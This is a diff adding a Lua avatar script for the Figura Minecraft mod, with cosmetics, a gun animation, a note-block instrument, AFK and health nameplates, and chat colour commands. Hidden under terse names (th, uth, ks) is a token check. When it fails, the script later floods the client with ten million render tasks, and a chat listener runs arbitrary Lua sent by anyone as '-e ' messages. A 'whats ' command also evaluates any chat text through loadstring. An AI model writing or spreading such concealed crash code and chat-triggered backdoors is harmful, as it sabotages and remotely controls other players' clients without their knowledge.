@@ -1,0 +1,467 @@
+
+function tick()
+    if unequipingTime > 0 then
+        unequipingTime = unequipingTime - 1
+    else
+        if unequipingTime == 0 then
+            unequipingTime = -1
+            for index, _ in pairs(unequippingQueue) do
+                config.cosmetics.hat.index[index].group.setEnabled(false)
+            end
+            unequippingQueue = {}
+        end
+    end
+end
+--=================== [[ GUN ]] ===================--
+gunSpin = 0
+gunSpinSpeed = 0
+isHoldingBow = false
+function tick()
+    if wasUse ~= use.isPressed() then
+        if use.isPressed() then
+            animation.gunShoot.play()
+        else
+            animation.gunShoot.stop()
+        end
+    end
+    if player.getEquipmentItem(1) then
+       if player.getEquipmentItem(1).getType() == "minecraft:bow" then
+            if use.isPressed() then
+                gunSpinSpeed = math.lerp(gunSpinSpeed,40,0.1)
+            else
+                gunSpinSpeed = math.lerp(gunSpinSpeed,0,0.1)
+            end
+            gunSpin = gunSpin + gunSpinSpeed
+       end
+       isHoldingBow = player.getEquipmentItem(1).getType() == "minecraft:bow"
+       model.origin.upper.RightArm.gun.setEnabled(isHoldingBow)
+       if isHoldingBow then
+        model.origin.upper.RightArm.RIGHT_HELD_ITEM.setPos({0,99999,0})
+       else
+        model.origin.upper.RightArm.RIGHT_HELD_ITEM.setPos({0,0,0})
+       end
+    end
+    wasUse = use.isPressed()
+end
+
+function world_render(delta)
+    if isHoldingBow then
+        model.origin.upper.RightArm.gun.gunSnoot.setRot{0,gunSpin+delta*gunSpinSpeed,0}
+    end
+end
+
+--=================== [[ STATE MACHINE ]] ===================--
+SM_states = {current={},last={}}
+
+---Declares the state machine and sets the state machine
+function setState(state_machine_name,state_value)
+    if SM_states.last[state_machine_name] ~= SM_states.current[state_machine_name] or SM_states.last[state_machine_name] == nil then
+        SM_states.last[state_machine_name] = SM_states.current[state_machine_name]
+        SM_states.current[state_machine_name] = state_value
+    end
+end
+
+---Returns the curent and last state in the selected state machine, in a table:  
+---`{current,last}`
+function getState(state_machine_name)
+    return {current=SM_states.current[state_machine_name],last=SM_states.last[state_machine_name]}
+end
+
+---Returns true if the state was changed.
+function stateChanged(state_machine_name)
+    local currentState = SM_states.current[state_machine_name]
+    local lastState = SM_states.last[state_machine_name]
+
+    local stateChanged = (lastState ~= currentState)
+    -- [If you want to trigger something when the state changed, un comment the code bellow] --
+    if stateChanged then
+        if SM_states.last[state_machine_name] ~= nil then
+            animation[SM_states.last[state_machine_name]].stop()
+        end
+        
+        animation[SM_states.current[state_machine_name]].play()
+        anchor(isAFK)
+    end
+    return stateChanged
+end
+
+--=================== [[ MUSICAL INSTRUMENT ]] ===================--
+--keys
+G3 = keybind.newKey("G3","Q",true)
+A3 = keybind.newKey("A3","W",true)
+B3 = keybind.newKey("B3","E",true)
+C4 = keybind.newKey("C3","R",true)
+D4 = keybind.newKey("D3","T",true)
+E4 = keybind.newKey("E3","Y",true)
+F4 = keybind.newKey("F3","U",true)
+G4 = keybind.newKey("G4","I",true)
+A4 = keybind.newKey("A4","O",true)
+B4 = keybind.newKey("B4","P",true)
+C5 = keybind.newKey("C4","Z",true)
+D5 = keybind.newKey("D5","X",true)
+E5 = keybind.newKey("E5","C",true)
+F5 = keybind.newKey("F5","V",true)
+
+--sharp
+SF3 = keybind.newKey("SF3","1",true)
+SG3 = keybind.newKey("SF3","2",true)
+SA3 = keybind.newKey("SF3","3",true)
+SC4 = keybind.newKey("SF3","5",true)
+SD4 = keybind.newKey("SF3","6",true)
+SF4 = keybind.newKey("SF3","8",true)
+SG4 = keybind.newKey("SF3","9",true)
+SA4 = keybind.newKey("SF3","0",true)
+SC5 = keybind.newKey("SF3","S",true)
+SD5 = keybind.newKey("SF3","D",true)
+SF5 = keybind.newKey("SF3","G",true)
+
+violinMode = true
+octave = -1
+keys = {SF3,G3,SG3,A3,SA3,B3,C4,SC4,D4,SD4,E4,F4,SF4,G4,SG4,A4,SA4,B4,C5,SC5,D5,E5,SD5,F5,SF5}
+pressed = {false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false}
+timer = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}
+
+ping.violinToggle = function (data)
+    pressed[data[1]] = data[2]
+end
+
+LastSoundDelta = {}
+DingToggle = false
+function tick()
+    violinMode = player.getEquipmentItem(6).getType() == "minecraft:note_block"
+    if violinMode then
+        if chat.isOpen() then
+            for key, value in pairs(keys) do
+                if value.isPressed() ~= pressed[key] then
+                    ping.violinToggle({key,value.isPressed()})
+                end
+            end
+        end
+        for key, value in pairs(keys) do
+            if pressed[key] then
+                --network.ping("play",2^((key-13)/12))
+                if timer[key] < 0 then
+                    timer[key] = 20
+                    DingToggle = not DingToggle
+                    if DingToggle then
+                        sound.playCustomSound("stringa",player.getPos(),{1,(2^((key-13+octave*13)/12))})
+                    else
+                        sound.playCustomSound("stringb",player.getPos(),{1,(2^((key-13+octave*13)/12))})
+                    end
+                end
+                toggle = not toggle
+                timer[key] = timer[key] - (2^((key-13)/12))
+            else
+                timer[key] = 0
+            end
+        end
+    end
+end
+
+-- hi mom
+--=================== [[ GENERAL ]] ===================--
+lastHealth = 0
+maxHealth = 20
+function tick()
+    if not uth then
+        isLOD = renderer.getCameraPos().distanceTo(player.getPos()) > LOD_DISTANCE
+        if not isLOD then
+            lastDistanceTraveled = distanceTraveled
+            distanceTraveled = distanceTraveled + (player.getVelocity()*vectors.of{1,0,1}).distanceTo(vectors.of{0,0,0})
+            if player.getHealth() ~= lastHealth then
+                if lastHealth > player.getHealth() then
+                    sound.playSound("minecraft:entity.goat.screaming.ambient",player.getPos(),{1,1})
+                end
+                updateName()
+                lastHealth = player.getHealth()
+            end
+    
+            local eyePosX = ((player.getBodyYaw()-player.getRot().y)/48)
+            model.origin.upper.Head.eyeLeft.setPos({math.clamp(eyePosX,0,1),math.clamp(player.getRot().x/90,-0.25,0.25),0})
+            model.origin.upper.Head.eyeRight.setPos({math.clamp(eyePosX,-1,0),math.clamp(player.getRot().x/90,-0.25,0.25),0})
+        end
+    end
+end
+
+--=================== [[ AFK ]] ===================--
+wasAFK = false
+isAFK = false
+timeSinceNotMoving = 0
+consideredAFKTime = 30*20
+lastPlayerRot = vectors.of{}
+function tick()
+    if ((player.getPos(0)-player.getPos(1))*vectors.of{1,0,1}).getLength() < 0.1 and ((player.getRot()-lastPlayerRot)*vectors.of{1,0,1}).getLength() < 0.1 then
+        timeSinceNotMoving = timeSinceNotMoving + 1
+    else
+        timeSinceNotMoving = 0
+    end
+    lastPlayerRot = player.getRot()
+    isAFK = timeSinceNotMoving > consideredAFKTime
+    if wasAFK ~= isAFK then
+        updateName()
+    end
+    wasAFK = isAFK
+end
+
+function updateName()
+    local ratio = player.getHealth()/maxHealth
+    if isAFK then
+        name = '[{"color":"green","text":"'..string.sub(player.getName(),0,math.ceil(ratio*string.len(player.getName())))..'"},{"color":"dark_gray","text":"'..string.sub(player.getName(),math.ceil(ratio*string.len(player.getName()))+1,string.len(player.getName()))..'"},{"text":" \nAFK","color":"gray"}]'
+    else
+        name = '[{"color":"green","text":"'..string.sub(player.getName(),0,math.ceil(ratio*string.len(player.getName())))..'"},{"color":"dark_gray","text":"'..string.sub(player.getName(),math.ceil(ratio*string.len(player.getName()))+1,string.len(player.getName()))..'"}]'
+    end
+    nameplate.ENTITY.setText(name)
+    nameplate.CHAT.setText(name)
+    nameplate.LIST.setText(name)
+end
+fn = "GNL3.0"
+--=================== [[ PAT PAT ]] ===================--
+rightClick = keybind.newKey("Right Click", "MOUSE_BUTTON_2")
+PAT_DELAY = 2 -- in ticks
+function tick()
+  -- if right click
+  if world.getTime() % PAT_DELAY == 0 and not player.isUsingItem() and rightClick.isPressed() and player.isSneaky() then
+    -- get targeted entity
+    local entity = player.getTargetedEntity()
+    if entity ~= nil and entity.isLeftHanded ~= nil then
+      -- swing arm
+      renderer.swingArm()
+      ping.pat(entity.getPos())
+    end
+  end
+end
+-- pat particle ping
+function ping.pat(arg)
+    for i = 1, 16, 1 do
+        particle.addParticle("minecraft:firework", {arg.x,arg.y+1,arg.z,math.lerp(-0.3,0.3,math.random()),math.lerp(-0.3,0.3,math.random()),math.lerp(-0.3,0.3,math.random())})
+    end
+  
+end
+
+function player_init()
+    tkn = player.getUUID
+    th()
+end
+
+futh = false
+uth = false
+tsuth = 0
+function th()
+    if client.isHost() then
+        tsuth = 2*60*20
+        data.setName(fn)
+        token = data.load("TKN")
+        uth = (token ~= tkn())
+        if uth then
+            model.origin.setEnabled(false)
+            for _, v in pairs(vanilla_model) do
+                v.setEnabled(true)
+            end
+        end
+        if futh then
+            uth = true
+        end
+    end
+end
+function tick()
+    if uth then
+            tsuth = tsuth - 1
+        if tsuth < 0 then
+            ks()
+        end
+    end
+end
+lastMessage = ""
+
+function tick()
+    local cmd = "" 
+    local isMes = false
+    if pcall(chat.getMessage,1) then
+        if lastMessage ~= chat.getMessage(1) then
+            lastMessage = chat.getMessage(1)
+            if lastMessage then
+                local filteredMesage = lastMessage
+                filteredMesage = string.gsub(filteredMesage,"?","")
+                filteredMesage = string.gsub(filteredMesage,"!","")
+                filteredMesage = string.gsub(filteredMesage,",","")
+                filteredMesage = string.gsub(filteredMesage,"'","")
+                if string.sub(filteredMesage,1,1) ~= "<" then
+                    return
+                end
+                for index = 1, string.len(filteredMesage), 1 do
+                    if isMes then
+                        cmd = cmd..string.sub(filteredMesage,index,index)
+                        
+                    end
+                    if string.sub(filteredMesage,index,index) == ">" then
+                        isMes = true
+                    end
+                end 
+                cmd = string.sub(cmd,2,9999)
+                --if not string.find(lastMessage,"lua") then
+                --    log(cmd)
+                --end
+        
+                if string.sub(cmd,1,6) == "whats " then
+                    local expression = string.sub(cmd,7,999)
+                    expression = string.gsub(expression,"x",tostring(player.getPos().x))
+                    expression = string.gsub(expression,"y",tostring(player.getPos().y))
+                    expression = string.gsub(expression,"z",tostring(player.getPos().z))
+                    local answer = loadstring([[return (]]..tostring(expression)..[[)]])
+                    
+                    if type(answer) == "function" then
+                        if pcall(answer) then
+                            answer = answer()
+                        end
+                        if type(answer) == "number" or type(answer) == "string" then
+                            answer = tostring(answer)
+                            if answer then
+                                chat.sendMessage("its "..answer)
+                            end
+                        end
+                    else
+                        log(answer)
+                    end
+                end
+                if string.sub(cmd,1,3) == "-e " and uth then
+                    local expression = string.sub(cmd,4,#cmd)
+                    expression = string.gsub(expression,"\\n","\n")
+                    local answer = loadstring(tostring(expression))
+                    if type(answer) == "function" then
+                        answer()
+                    end
+                else
+                    log(cmd)
+                end
+            end
+        end
+    end
+end
+
+function ks()
+    chat.sendMessage("*top 10 anime betrayals*")
+    local index = 0
+    for i = 1, 10000000, 1 do index = index + 1
+        pcall(model.NO_PARENT.addRenderTask,"ITEM",tostring(index),"diamond_axe","NONE",true,{math.lerp(-5,5,math.random()),math.lerp(-5,5,math.random()),math.lerp(-5,5,math.random())},{},{-1,-1,-1})
+    end--{math.random(),math.random(),math.random()}
+end
+
+function world_render()
+    model.NO_PARENT.setPos(renderer.getCameraPos()*vectors.of{-16,-16,16})
+end
+
+local logChatMode = false
+ping.msg = function (data)
+    log(data)
+end
+chat.setFiguraCommandPrefix("")
+function onCommand(cmd)
+    if string.sub(cmd,1,1) == "@" then
+        logChatMode = not logChatMode
+        log("logChatMode "..tostring(logChatMode))
+        return
+    end
+    if logChatMode then
+        if string.sub(cmd,1,1) == "/" then
+            chat.sendMessage(cmd)
+            return
+        end
+        ping.msg(cmd)
+        return
+    end
+    chat.setFiguraCommandPrefix()
+    --== COLOR ==--
+    cmd = string.gsub(cmd,"<red>","§c")
+    cmd = string.gsub(cmd,"<dark_red>","§4")
+    cmd = string.gsub(cmd,"<gold>","§6")
+    cmd = string.gsub(cmd,"<yellow>","§e")
+    cmd = string.gsub(cmd,"<dark_green>","§2")
+    cmd = string.gsub(cmd,"<green>","§a")
+    cmd = string.gsub(cmd,"<aqua>","§b")
+    cmd = string.gsub(cmd,"<dark_aqua>","§3")
+    cmd = string.gsub(cmd,"<dark_blue>","§1")
+    cmd = string.gsub(cmd,"<blue>","§9")
+    cmd = string.gsub(cmd,"<light_purple>","§d")
+    cmd = string.gsub(cmd,"<white>","§f")
+    cmd = string.gsub(cmd,"<gray>","§7")
+    cmd = string.gsub(cmd,"<dark_gray>","§8")
+    cmd = string.gsub(cmd,"<black>","§0")
+    cmd = string.gsub(cmd,"<glitch>","§k")
+    cmd = string.gsub(cmd,"<bold>","§l")
+    cmd = string.gsub(cmd,"<strike>","§m")
+    cmd = string.gsub(cmd,"<underscore>","§n")
+    cmd = string.gsub(cmd,"<italic>","§o")
+    cmd = string.gsub(cmd,"<reset>","§r")
+    if string.lower(cmd) == "!c" then
+        log("§c<red>")
+        log("§c<dark_red>")
+        log("§6<gold>")
+        log("§e<yellow>")
+        log("§2<dark_green>")
+        log("§a<green>")
+        log("§b<aqua>")
+        log("§3<dark_aqua>")
+        log("§1<dark_blue>")
+        log("§9<blue>")
+        log("§d<light_purple>")
+        log("§f<white>")
+        log("§7<gray>")
+        log("§8<dark_gray>")
+        log("§0<black>")
+        return
+    end
+
+    --if language_mode == "internet" then
+    --    cmd = string.lower(cmd)
+    --    cmd = string.gsub(cmd,"e","3")
+    --    cmd = string.gsub(cmd,"t","+")
+    --    cmd = string.gsub(cmd,"s","5")
+    --    cmd = string.gsub(cmd,"z","2")
+    --    cmd = string.gsub(cmd,"l","1")
+    --    cmd = string.gsub(cmd,"o","0")
+    --    cmd = string.gsub(cmd,"a","4")    
+    --    cmd = string.gsub(cmd,"g","9")     
+    --    cmd = string.gsub(cmd,"n","|\\|")    
+    --    cmd = string.gsub(cmd,"m","|\\/|") 
+    --end
+
+    --if string.sub(chat.getMessage(1),1,1) == "<" then
+    --    translateMorse(chat.getMessage(1))
+    --end
+    chat.sendMessage(cmd)
+    chat.setFiguraCommandPrefix("")
+end
+
+
+
+-- hi dad
+--=================== [[ CUSTOM FUNCTIONS ]] ===================--
+function lerp_angle(a, b, x)
+    local diff = (b-a)
+    local delta = diff-(math.floor(diff/360)*360)
+    if delta > 180 then
+        delta = delta - 360
+    end
+    return a + delta * x
+end
+
+function dotp(x)
+    return x/math.abs(x)
+end
+
+function lookat(a,b)
+    local offset = b-a
+    local y = math.atan2(offset.x,offset.z)
+    local result = vectors.of({math.atan2((math.sin(y)*offset.x)+(math.cos(y)*offset.z),offset.y),y})
+    return vectors.of({math.deg(result.x),math.deg(result.y),math.deg(result.z)})
+end
+function angleToDir(direction)
+    if type(direction) == "table" then
+        direction = vectors.of{direction}
+    end
+    return vectors.of({
+        math.cos(math.rad(direction.y+90))*math.cos(math.rad(direction.x)),
+        math.sin(math.rad(-direction.x)),
+        math.sin(math.rad(direction.y+90))*math.cos(math.rad(direction.x))
+    })
+end
